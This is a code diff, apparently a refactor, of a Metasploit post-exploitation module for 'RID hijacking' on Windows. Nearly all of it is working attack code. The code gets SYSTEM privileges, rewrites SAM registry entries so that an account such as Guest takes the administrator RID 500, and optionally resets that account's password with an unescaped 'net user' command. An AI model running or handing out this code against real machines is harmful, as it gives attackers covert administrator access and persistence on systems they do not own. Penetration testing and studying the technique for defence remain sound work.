@@ -7,10 +7,10 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::Priv
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Manage RID Hijacking',
-      'Description'   => %q{
+  def initialize
+    super(
+      'Name' => 'Windows Manage RID Hijacking',
+      'Description' => %q{
         This module will create an entry on the target by modifying some properties
         of an existing account. It will change the account attributes by setting a
         Relative Identifier (RID), which should be owned by one existing
@@ -24,24 +24,24 @@ class MetasploitModule < Msf::Post
       },
       'License'       => MSF_LICENSE,
       'Author'        => 'Sebastian Castro <sebastian.castro[at]cslcolombia.com>',
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ],
+      'Platform'      => ['win'],
+      'SessionTypes'  => ['meterpreter'],
       'References'	=> [
-        [ 'URL', 'http://csl.com.co/rid-hijacking/']
-      ]
-    ))
+        ['URL', 'http://csl.com.co/rid-hijacking/']
+      ])
 
     register_options(
-    [
-      OptBool.new('GETSYSTEM',   [true,  'Attempt to get SYSTEM privilege on the target host.', false]),
-      OptBool.new('GUEST_ACCOUNT',   [true,  'Assign the defined RID to the Guest Account.', false]),
-      OptString.new('USERNAME',  [false, 'User to set the defined RID.']),
-      OptString.new('PASSWORD',  [false, 'Password to set to the defined user account.']),
-      OptInt.new('RID', [true, 'RID to set to the specified account.', 500]),
-    ])
+      [
+        OptBool.new('GETSYSTEM', [true, 'Attempt to get SYSTEM privilege on the target host.', false]),
+        OptBool.new('GUEST_ACCOUNT', [true, 'Assign the defined RID to the Guest Account.', false]),
+        OptString.new('USERNAME', [false, 'User to set the defined RID.']),
+        OptString.new('PASSWORD', [false, 'Password to set to the defined user account.']),
+        OptInt.new('RID', [true, 'RID to set to the specified account.', 500])
+      ]
+    )
   end
 
-  def get_system
+  def getsystem
     results = session.priv.getsystem
     if results[0]
       return true
@@ -54,43 +54,40 @@ class MetasploitModule < Msf::Post
     names_key.each do |name|
       skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
       rid_user = skey['Type']
-      if rid_user == rid
-        return name
-      end
+      return name if rid_user == rid
     end
     return nil
   end
 
   def get_user_rid(reg_key, username, names_key)
     names_key.each do |name|
-      if (name.casecmp(username) == 0)
-        print_good("Found #{name} account!")
-        skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
-        rid = skey['Type']
-        return rid
-        if not skey
-          print_error("Could not open user's key")
-          return -1
-        end
+      next unless name.casecmp(username).zero?
+      print_good("Found #{name} account!")
+      skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
+      rid = skey['Type']
+      if !skey
+        print_error("Could not open user's key")
+        return -1
       end
+      return rid
     end
     return -1
   end
 
-  def check_active(f)
-    if f[0x38].unpack("H*")[0].to_i != 10
+  def check_active(fbin)
+    if fbin[0x38].unpack("H*")[0].to_i != 10
       return true
     else
       return false
     end
   end
 
-  def swap_rid(f, rid)
+  def swap_rid(fbin, rid)
     # This function will set hex format to a given RID integer
-    hex = [("%04x" % rid).scan(/.{2}/).reverse.join].pack("H*")
+    hex = [format("%04x", rid).scan(/.{2}/).reverse.join].pack("H*")
     # Overwrite new RID at offset 0x30
-    f[0x30, 2] = hex
-    return f
+    fbin[0x30, 2] = hex
+    return fbin
   end
 
   def run
@@ -99,10 +96,10 @@ class MetasploitModule < Msf::Post
 
     # Checks privileges of the session, and tries to get SYSTEM privileges if needed.
     print_status("Checking for SYSTEM privileges on session")
-    unless(is_system?())
-      if (datastore['GETSYSTEM'])
+    if !is_system?
+      if datastore['GETSYSTEM']
         print_status("Trying to get SYSTEM privileges")
-        if get_system
+        if getsystem
           print_good("Got SYSTEM privileges")
         else
           print_error("Could not obtain SYSTEM privileges")
@@ -117,7 +114,7 @@ class MetasploitModule < Msf::Post
     end
 
     # Checks the Windows Version.
-    wver = sysinfo()["OS"]
+    wver = sysinfo["OS"]
     print_status("Target OS: #{wver}")
 
     # Load the usernames from SAM Registry key
@@ -130,12 +127,12 @@ class MetasploitModule < Msf::Post
     # If username is set, looks for it in SAM registry key
     user_rid = -1
     username = datastore['USERNAME']
-    if (datastore['GUEST_ACCOUNT'])
+    if datastore['GUEST_ACCOUNT']
       user_rid = 0x1f5
       print_status("Target account: Guest Account")
       username = get_name_from_rid(reg_key, user_rid, names_key)
     else
-      if (datastore['USERNAME'].to_s.empty?)
+      if datastore['USERNAME'].to_s.empty?
         print_error("You must set an username or enable GUEST_ACCOUNT option")
         return
       end
@@ -172,17 +169,15 @@ class MetasploitModule < Msf::Post
       open_key = registry_setvaldata(reg_key + "\\#{r}", "F", f, "REG_BINARY")
       unless open_key
         print_error("Can't write to registry... Something's wrong!")
-        return
+        return -1
       end
       print_good("The RID #{datastore['RID']} is set to the account #{username} with original RID #{user_rid}")
-
-      # If set, changes the specified username's password
-      if (datastore['PASSWORD'])
-        print_status("Setting #{username} password to #{datastore['PASSWORD']}")
-        cmd = cmd_exec('cmd.exe', "/c net user #{username} #{datastore['PASSWORD']}")
-        vprint_status("#{cmd}")
-      end
+    end
+    # If set, changes the specified username's password
+    if datastore['PASSWORD']
+      print_status("Setting #{username} password to #{datastore['PASSWORD']}")
+      cmd = cmd_exec('cmd.exe', "/c net user #{username} #{datastore['PASSWORD']}")
+      vprint_status(cmd.to_s)
     end
   end
 end
-
